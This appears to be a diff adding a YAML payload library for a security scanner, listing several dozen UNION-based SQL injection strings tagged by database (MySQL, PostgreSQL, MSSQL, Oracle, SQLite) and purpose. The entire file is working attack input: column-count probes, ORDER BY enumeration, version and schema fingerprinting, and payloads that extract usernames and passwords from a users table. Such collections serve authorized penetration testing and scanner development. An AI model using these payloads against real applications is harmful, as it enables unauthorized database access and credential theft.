@@ -1,0 +1,189 @@
+name: "SQLi UNION Payloads"
+description: "SQL injection payloads using UNION-based techniques"
+attack_type: "sqli"
+category: "union"
+
+payloads:
+  # Basic UNION payloads
+  - value: "' UNION SELECT NULL--"
+    description: "Single column UNION"
+    tags: ["union", "basic"]
+
+  - value: "' UNION SELECT NULL,NULL--"
+    description: "Two column UNION"
+    tags: ["union", "basic"]
+
+  - value: "' UNION SELECT NULL,NULL,NULL--"
+    description: "Three column UNION"
+    tags: ["union", "basic"]
+
+  - value: "' UNION SELECT NULL,NULL,NULL,NULL--"
+    description: "Four column UNION"
+    tags: ["union", "basic"]
+
+  - value: "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+    description: "Five column UNION"
+    tags: ["union", "basic"]
+
+  # UNION ALL variants
+  - value: "' UNION ALL SELECT NULL--"
+    description: "UNION ALL single column"
+    tags: ["union", "union-all"]
+
+  - value: "' UNION ALL SELECT NULL,NULL,NULL--"
+    description: "UNION ALL three columns"
+    tags: ["union", "union-all"]
+
+  # Numeric context
+  - value: "1 UNION SELECT NULL--"
+    description: "Numeric UNION"
+    tags: ["union", "numeric"]
+
+  - value: "1 UNION SELECT NULL,NULL,NULL--"
+    description: "Numeric UNION 3 cols"
+    tags: ["union", "numeric"]
+
+  # String extraction
+  - value: "' UNION SELECT username FROM users--"
+    description: "Extract username"
+    tags: ["union", "extraction"]
+
+  - value: "' UNION SELECT password FROM users--"
+    description: "Extract password"
+    tags: ["union", "extraction"]
+
+  - value: "' UNION SELECT username,password FROM users--"
+    description: "Extract credentials"
+    tags: ["union", "extraction"]
+
+  # MySQL specific
+  - value: "' UNION SELECT @@version--"
+    description: "MySQL version"
+    tags: ["union", "mysql", "info"]
+
+  - value: "' UNION SELECT user()--"
+    description: "MySQL current user"
+    tags: ["union", "mysql", "info"]
+
+  - value: "' UNION SELECT database()--"
+    description: "MySQL database name"
+    tags: ["union", "mysql", "info"]
+
+  - value: "' UNION SELECT table_name FROM information_schema.tables--"
+    description: "MySQL list tables"
+    tags: ["union", "mysql", "enum"]
+
+  - value: "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--"
+    description: "MySQL list columns"
+    tags: ["union", "mysql", "enum"]
+
+  - value: "' UNION SELECT CONCAT(username,':',password) FROM users--"
+    description: "MySQL concat extraction"
+    tags: ["union", "mysql", "extraction"]
+
+  # PostgreSQL specific
+  - value: "' UNION SELECT version()--"
+    description: "PostgreSQL version"
+    tags: ["union", "postgresql", "info"]
+
+  - value: "' UNION SELECT current_user--"
+    description: "PostgreSQL current user"
+    tags: ["union", "postgresql", "info"]
+
+  - value: "' UNION SELECT current_database()--"
+    description: "PostgreSQL database"
+    tags: ["union", "postgresql", "info"]
+
+  - value: "' UNION SELECT table_name FROM information_schema.tables--"
+    description: "PostgreSQL list tables"
+    tags: ["union", "postgresql", "enum"]
+
+  # MSSQL specific
+  - value: "' UNION SELECT @@version--"
+    description: "MSSQL version"
+    tags: ["union", "mssql", "info"]
+
+  - value: "' UNION SELECT SYSTEM_USER--"
+    description: "MSSQL system user"
+    tags: ["union", "mssql", "info"]
+
+  - value: "' UNION SELECT DB_NAME()--"
+    description: "MSSQL database name"
+    tags: ["union", "mssql", "info"]
+
+  - value: "' UNION SELECT name FROM sysobjects WHERE xtype='U'--"
+    description: "MSSQL list tables"
+    tags: ["union", "mssql", "enum"]
+
+  # Oracle specific
+  - value: "' UNION SELECT NULL FROM dual--"
+    description: "Oracle UNION basic"
+    tags: ["union", "oracle", "basic"]
+
+  - value: "' UNION SELECT banner FROM v$version--"
+    description: "Oracle version"
+    tags: ["union", "oracle", "info"]
+
+  - value: "' UNION SELECT user FROM dual--"
+    description: "Oracle current user"
+    tags: ["union", "oracle", "info"]
+
+  - value: "' UNION SELECT table_name FROM all_tables--"
+    description: "Oracle list tables"
+    tags: ["union", "oracle", "enum"]
+
+  # SQLite specific
+  - value: "' UNION SELECT sqlite_version()--"
+    description: "SQLite version"
+    tags: ["union", "sqlite", "info"]
+
+  - value: "' UNION SELECT name FROM sqlite_master WHERE type='table'--"
+    description: "SQLite list tables"
+    tags: ["union", "sqlite", "enum"]
+
+  # Comment variations
+  - value: "' UNION SELECT NULL-- -"
+    description: "Space after comment"
+    tags: ["union", "comment"]
+
+  - value: "' UNION SELECT NULL#"
+    description: "Hash comment (MySQL)"
+    tags: ["union", "comment", "mysql"]
+
+  - value: "' UNION SELECT NULL/*"
+    description: "Block comment start"
+    tags: ["union", "comment"]
+
+  - value: "' UNION SELECT NULL;--"
+    description: "Semicolon terminated"
+    tags: ["union", "semicolon"]
+
+  # Parenthesis variations
+  - value: "') UNION SELECT NULL--"
+    description: "Close paren UNION"
+    tags: ["union", "parenthesis"]
+
+  - value: "')) UNION SELECT NULL--"
+    description: "Double close paren"
+    tags: ["union", "parenthesis"]
+
+  - value: "1) UNION SELECT NULL--"
+    description: "Numeric paren close"
+    tags: ["union", "parenthesis", "numeric"]
+
+  # ORDER BY enumeration
+  - value: "' ORDER BY 1--"
+    description: "Order by 1 (column count)"
+    tags: ["union", "order-by", "enum"]
+
+  - value: "' ORDER BY 5--"
+    description: "Order by 5"
+    tags: ["union", "order-by", "enum"]
+
+  - value: "' ORDER BY 10--"
+    description: "Order by 10"
+    tags: ["union", "order-by", "enum"]
+
+  - value: "' ORDER BY 100--"
+    description: "Order by 100 (error expected)"
+    tags: ["union", "order-by", "enum"]
